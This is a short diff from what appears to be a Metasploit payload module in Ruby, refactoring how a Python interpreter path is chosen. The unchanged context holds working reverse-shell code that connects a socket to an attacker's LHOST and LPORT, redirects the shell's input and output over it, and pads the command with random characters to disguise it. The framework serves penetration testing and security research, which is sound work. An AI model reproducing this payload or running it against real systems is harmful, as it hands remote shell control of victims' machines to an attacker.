@@ -59,10 +59,7 @@ module MetasploitModule
   def command_string
     raw_cmd = "import socket,subprocess,os;host=\"#{datastore['LHOST']}\";port=#{datastore['LPORT']};s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((host,port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(\"#{datastore['SHELL']}\")"
     cmd = raw_cmd.gsub(/,/, "#{random_padding},#{random_padding}").gsub(/;/, "#{random_padding};#{random_padding}")
-    if datastore['PythonPath'].nil?
-      return "echo #{Shellwords.escape(py_create_exec_stub(cmd))} | $(which python || which python3 || which python2) -"
-    else
-      return "echo #{Shellwords.escape(py_create_exec_stub(cmd))} | #{datastore['PythonPath']}  -"
-    end
+    python_path = datastore['PythonPath'].blank? ? '$(which python || which python3 || which python2)' : datastore['PythonPath']
+    "echo #{Shellwords.escape(py_create_exec_stub(cmd))} | #{python_path}"
   end
 end
